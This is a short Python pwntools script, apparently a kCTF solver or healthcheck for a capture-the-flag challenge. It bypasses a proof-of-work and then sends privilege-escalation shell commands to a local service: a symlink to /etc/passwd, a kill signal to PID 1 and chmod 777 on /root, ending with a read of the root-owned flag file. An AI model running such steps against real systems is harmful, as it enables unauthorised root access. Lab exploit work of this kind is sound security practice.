#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *

context.log_level = 'debug'

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)


r.recvuntil('/ $ ')

r.sendline(b'ln -s /etc/passwd /tmp/fishing && echo OK')
r.recvuntil(b"echo OK")
r.recvuntil(b"OK")
r.sendline(b'mv plnfwkjmdejpkz test; echo OK')
r.recvuntil(b"echo OK")
r.recvuntil(b"OK")
r.sendline(b'kill -64 1 && echo OK')
r.recvuntil(b"echo OK")
r.recvuntil(b"OK")
r.sendline(b'chmod 777 /root && echo OK')
r.recvuntil(b"echo OK")
r.recvuntil(b"OK")
r.sendline(b'cd root && echo OK')
r.recvuntil(b"echo OK")
r.recvuntil(b"OK")
r.sendline(b'cat flag.txt')
r.recvuntil(b"cat flag.txt\r\n")
data = r.recvline()
if b'idek{' in data:
    r.sendline(b'exit')
    r.recvuntil(b'exit')
    exit(0)
exit(1)


r.interactive()